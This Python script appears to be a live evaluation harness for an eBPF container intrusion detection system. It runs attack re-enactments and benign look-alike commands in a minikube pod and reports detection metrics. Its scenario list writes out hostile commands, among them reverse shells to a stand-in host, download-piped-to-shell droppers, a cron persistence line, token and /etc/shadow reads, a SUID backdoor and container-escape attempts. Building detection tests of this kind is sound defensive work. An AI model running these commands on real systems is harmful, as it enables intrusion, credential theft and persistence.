"""Evaluation Module - live attack simulation on the minikube cluster.

Runs harmless re-enactments of common container attack techniques and a set
of benign (but look-alike) admin commands inside the ``ids-demo/shop-web``
pod, then asks the backend which kernel events the IDS flagged.  Reports:

  * detection rate        attack scenarios with >=1 suspicious event
  * false-positive rate   benign scenarios with >=1 suspicious event
  * detection latency     kernel event -> agent verdict (ms)
  * resource overhead     exec-loop slowdown with the agent on vs. off,
                          plus agent CPU / memory from the heartbeats

All network targets are unroutable CGNAT addresses (100.100.x.x) and the
"malware" binaries are renamed copies of /bin/sleep and python3, so nothing
malicious ever runs.  Results are printed, saved to evaluation/results/ and
pushed to the dashboard (Evaluation page).

Usage:
    .venv/bin/python evaluation/run_live_eval.py [--skip-overhead] [--no-build]
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import statistics
import subprocess
import sys
import time
from datetime import datetime, timezone

import requests

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
NS, DEPLOY, IDS_NS = "ids-demo", "shop-web", "ebpf-ids"
C2 = "100.100.23.7"  # CGNAT: never routed on the internet

# (name, kind, category, command run with `sh -c` inside the pod)
SCENARIOS = [
    # ---------------------------------------------------------------- attacks
    ("Bash reverse shell", "attack", "reverse_shell", f"timeout 3 bash -c 'bash -i >& /dev/tcp/{C2}/4444 0>&1'"),
    ("Netcat reverse shell", "attack", "reverse_shell", f"timeout 3 nc -e /bin/sh {C2} 4444"),
    ("Python reverse shell", "attack", "reverse_shell",
     "timeout 3 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
     f"s.settimeout(2);s.connect((\"{C2}\",9001));os.dup2(s.fileno(),0)'"),
    ("Download piped to shell", "attack", "dropper", f"curl -s --max-time 2 http://{C2}/payload.sh | sh"),
    ("Hidden binary run from /tmp", "attack", "dropper", "cp /bin/sleep /tmp/.kworker && /tmp/.kworker 0.1"),
    ("Crypto-miner process", "attack", "crypto_miner",
     "mkdir -p /tmp/.xm && cp /bin/sleep /tmp/.xm/xmrig && /tmp/.xm/xmrig -o stratum+tcp://pool.minexmr.com:4444 "
     "-u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge -p x "
     "--donate-level 1 || true"),
    ("Miner connecting to pool", "attack", "crypto_miner",
     f"cp $(command -v python3) /tmp/.xm/kworkerds && timeout 3 /tmp/.xm/kworkerds -c "
     f"\"import socket;socket.create_connection(('{C2}',3333),1)\" || true"),
    ("Service-account token theft", "attack", "credential_access",
     "cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null"),
    ("Password database read", "attack", "credential_access", "cat /etc/shadow > /dev/null"),
    ("Cloud metadata query", "attack", "credential_access",
     "curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true"),
    ("SUID shell backdoor", "attack", "privilege_escalation", "cp /bin/bash /tmp/.rootsh && chmod u+s /tmp/.rootsh"),
    ("Cron persistence", "attack", "privilege_escalation",
     f"echo '* * * * * root curl -s http://{C2}/c | sh' >> /etc/crontab"),
    ("nsenter into host namespaces", "attack", "container_escape", "nsenter --target 1 --mount --uts --ipc --net --pid -- true || true"),
    ("User-namespace unshare", "attack", "container_escape", "unshare -Ur true || true"),
    ("Docker socket access", "attack", "container_escape",
     "curl -s --max-time 2 --unix-socket /var/run/docker.sock http://localhost/containers/json || true"),
    ("Kubelet API access", "attack", "lateral_movement", "curl -sk --max-time 2 https://192.168.49.2:10250/pods || true"),
    ("Internal port scan", "attack", "discovery", "nc -zv -w 1 10.96.0.1 440-445 || true"),
    ("Container recon", "attack", "discovery", "cat /proc/1/cgroup; ls -la /.dockerenv; uname -a; id"),
    ("Fileless memfd payload", "attack", "defense_evasion",
     "python3 -c \"import os;f=os.memfd_create('');os.write(f,b'#!/bin/sh\\n');print(f)\""),
    ("History / log wiping", "attack", "defense_evasion", "bash -c 'unset HISTFILE; history -c'; rm -rf /var/log/apt"),
    # ---------------------------------------------------------------- benign look-alikes
    ("List application files", "benign", None, "ls -la /app"),
    ("Read hostname", "benign", None, "cat /etc/hostname"),
    ("Python one-liner", "benign", None, "python3 -c 'print(6*7)'"),
    ("Local health check (curl)", "benign", None, "curl -fs http://127.0.0.1:8080/health"),
    ("Wait-for dependency (nc -z)", "benign", None, f"nc -z -w 2 ids-backend.{IDS_NS} 8000 || true"),
    ("Port check via /dev/tcp", "benign", None, "timeout 2 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/8080'"),
    ("Process listing", "benign", None, "ps aux > /dev/null"),
    ("Decode base64 config", "benign", None, "echo aGVsbG8gd29ybGQ= | base64 -d > /tmp/greeting.txt"),
    ("pip version", "benign", None, "pip --version"),
    ("Find python files", "benign", None, "find /app -name '*.py'"),
    ("Backup app directory", "benign", None, "tar czf /tmp/app-backup.tgz /app"),
    ("Pretty-print JSON config", "benign", None, "python3 -m json.tool /app/config.json > /dev/null"),
    ("Check environment variable", "benign", None, "printenv HOSTNAME"),
    ("Disk usage", "benign", None, "df -h /"),
    ("Fetch own API", "benign", None, "wget -q -O /dev/null http://127.0.0.1:8080/"),
]


def sh(cmd: list[str], timeout=120, check=True) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=check)


def kexec(command: str, timeout=30) -> subprocess.CompletedProcess:
    return sh(["kubectl", "-n", NS, "exec", f"deploy/{DEPLOY}", "--", "sh", "-c", command], timeout=timeout, check=False)


def ensure_victim(build: bool):
    if build:
        print("building victim image ...")
        sh(["docker", "build", "--network", "host", "-q", "-t", "ids-victim:latest", os.path.join(ROOT, "evaluation", "victim")],
           timeout=900)
        sh(["minikube", "image", "load", "--overwrite=true", "ids-victim:latest"], timeout=900)
    sh(["kubectl", "apply", "-f", os.path.join(ROOT, "evaluation", "victim", "victim.yaml")])
    sh(["kubectl", "-n", NS, "rollout", "status", f"deploy/{DEPLOY}", "--timeout=180s"], timeout=200)


def api_session() -> tuple[requests.Session, str]:
    ip = sh(["minikube", "ip"]).stdout.strip()
    base = f"http://{ip}:30080"
    pw = base64.b64decode(sh(["kubectl", "-n", IDS_NS, "get", "secret", "ids-secrets", "-o",
                              "jsonpath={.data.admin-password}"]).stdout).decode()
    s = requests.Session()
    r = s.post(f"{base}/api/auth/login", json={"username": "admin", "password": pw}, timeout=10)
    r.raise_for_status()
    s.headers["Authorization"] = f"Bearer {r.json()['access_token']}"
    return s, base


def flagged_events(s, base, minutes) -> list[dict]:
    r = s.get(f"{base}/api/events", params={"namespace": NS, "label": "suspicious", "since_minutes": minutes,
                                            "limit": 1000}, timeout=20)
    r.raise_for_status()
    return r.json()["items"]


def exec_loop_seconds(n: int) -> float:
    code = (f"import subprocess,time;t=time.perf_counter();[subprocess.run(['/bin/true']) for _ in range({n})];"
            "print(time.perf_counter()-t)")
    out = kexec(f"python3 -c \"{code}\"", timeout=600)
    return float(out.stdout.strip().splitlines()[-1])


def agent_running() -> int:
    out = sh(["kubectl", "-n", IDS_NS, "get", "pods", "-l", "app.kubernetes.io/name=ids-agent", "--no-headers"], check=False)
    return len([line for line in out.stdout.splitlines() if "Running" in line])


def measure_overhead(n=2000, runs=3) -> dict:
    print(f"\nmeasuring exec overhead ({runs} x {n} fork+exec) ...")
    with_agent = [exec_loop_seconds(n) for _ in range(runs)]
    sh(["kubectl", "-n", IDS_NS, "patch", "ds", "ids-agent", "--type", "merge", "-p",
        '{"spec":{"template":{"spec":{"nodeSelector":{"ids-eval/agent-disabled":"true"}}}}}'])
    try:
        for _ in range(60):
            if agent_running() == 0:
                break
            time.sleep(2)
        time.sleep(3)
        without = [exec_loop_seconds(n) for _ in range(runs)]
    finally:
        sh(["kubectl", "-n", IDS_NS, "patch", "ds", "ids-agent", "--type", "json", "-p",
            '[{"op":"remove","path":"/spec/template/spec/nodeSelector"}]'])
        sh(["kubectl", "-n", IDS_NS, "rollout", "status", "ds/ids-agent", "--timeout=180s"], timeout=200)
    a, b = statistics.median(with_agent), statistics.median(without)
    return {"iterations": n, "runs": runs, "with_agent_seconds": round(a, 3), "baseline_seconds": round(b, 3),
            "overhead_percent": round((a - b) / b * 100, 2), "with_agent_runs": with_agent, "baseline_runs": without}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--skip-overhead", action="store_true")
    ap.add_argument("--no-build", action="store_true", help="victim image already loaded")
    a = ap.parse_args()

    ensure_victim(build=not a.no_build)
    s, base = api_session()
    start = time.time()
    windows = []
    print(f"\nrunning {len(SCENARIOS)} scenarios in {NS}/{DEPLOY} ...")
    for name, kind, cat, cmd in SCENARIOS:
        t0 = time.time()
        kexec(cmd)
        t1 = time.time()
        windows.append((name, kind, cat, cmd, t0, t1))
        time.sleep(1.5)  # keep scenario windows apart

    time.sleep(8)  # agent batch + shipping
    events = flagged_events(s, base, int((time.time() - start) / 60) + 2)
    results = []
    for name, kind, cat, cmd, t0, t1 in windows:
        hits = [e for e in events if t0 - 0.3 <= datetime.fromisoformat(e["ts"]).timestamp() <= t1 + 0.3]
        sev_rank = {"High": 3, "Medium": 2, "Low": 1}
        sev = max((e["prediction"].get("severity") for e in hits), key=lambda x: sev_rank.get(x, 0), default=None)
        lats = [e["prediction"].get("latency_ms") for e in hits if e["prediction"].get("latency_ms") is not None]
        titles = sorted({f"{e['prediction'].get('category')} ({e['event_type']}:{e['comm']}"
                         f"{' ' + ','.join(e['prediction'].get('rules') or []) if e['prediction'].get('rules') else ''})"
                         for e in hits})
        results.append({"name": name, "kind": kind, "category": cat, "command": cmd[:160], "detected": bool(hits),
                        "suspicious_events": len(hits), "severity": sev,
                        "latency_ms": round(min(lats), 1) if lats else None, "titles": titles[:6]})

    atk = [r for r in results if r["kind"] == "attack"]
    ben = [r for r in results if r["kind"] == "benign"]
    lats = sorted(r["latency_ms"] for r in atk if r["latency_ms"] is not None)
    report = {
        "target": f"{NS}/{DEPLOY}", "started_at": datetime.fromtimestamp(start, timezone.utc).isoformat(),
        "attacks": {"total": len(atk), "detected": sum(r["detected"] for r in atk),
                    "detection_rate": round(sum(r["detected"] for r in atk) / len(atk), 4)},
        "benign": {"total": len(ben), "false_positives": sum(r["detected"] for r in ben),
                   "false_positive_rate": round(sum(r["detected"] for r in ben) / len(ben), 4)},
        "latency_ms": {"avg": round(sum(lats) / len(lats), 1) if lats else None,
                       "p95": lats[min(len(lats) - 1, int(0.95 * len(lats)))] if lats else None,
                       "max": lats[-1] if lats else None},
        "results": results,
        "notes": "kubectl exec scenarios; harmless re-enactments",
    }
    if not a.skip_overhead:
        report["overhead"] = measure_overhead()
    agents = s.get(f"{base}/api/agents", timeout=10).json()
    if agents:
        lt = agents[0]["latest"]
        report["agent_resources"] = {k: lt.get(k) for k in ("cpu_percent", "rss_mb", "agent_rss_mb", "loader_rss_mb",
                                                            "events_per_sec", "kernel_events_dropped", "latency_p95_ms")}

    os.makedirs(os.path.join(ROOT, "evaluation", "results"), exist_ok=True)
    out = os.path.join(ROOT, "evaluation", "results", f"live_eval_{datetime.now():%Y%m%d_%H%M%S}.json")
    with open(out, "w") as fh:
        json.dump(report, fh, indent=2)
    s.post(f"{base}/api/evaluation/live", json=report, timeout=10).raise_for_status()

    print(f"\n{'scenario':34s} {'kind':7s} {'result':9s} {'sev':7s} {'latency':>9s}  detail")
    for r in results:
        ok = r["detected"] if r["kind"] == "attack" else not r["detected"]
        res = ("DETECTED" if r["detected"] else "missed") if r["kind"] == "attack" else ("FALSE+" if r["detected"] else "clean")
        lat = f"{r['latency_ms']} ms" if r["latency_ms"] is not None else "-"
        print(f"{'✔' if ok else '✘'} {r['name']:32s} {r['kind']:7s} {res:9s} {str(r['severity'] or '-'):7s} {lat:>9s}  "
              f"{'; '.join(r['titles'])[:90]}")
    print(f"\ndetection rate      : {report['attacks']['detected']}/{report['attacks']['total']} "
          f"= {report['attacks']['detection_rate']:.1%}")
    print(f"false-positive rate : {report['benign']['false_positives']}/{report['benign']['total']} "
          f"= {report['benign']['false_positive_rate']:.1%}")
    print(f"detection latency   : avg {report['latency_ms']['avg']} ms, p95 {report['latency_ms']['p95']} ms")
    if "overhead" in report:
        o = report["overhead"]
        print(f"exec overhead       : {o['overhead_percent']}% ({o['with_agent_seconds']}s with agent vs "
              f"{o['baseline_seconds']}s without, {o['iterations']} execs)")
    if report.get("agent_resources"):
        print(f"agent resources     : {report['agent_resources']}")
    print(f"\nsaved {out} and published to the dashboard")
    return 0


if __name__ == "__main__":
    sys.exit(main())
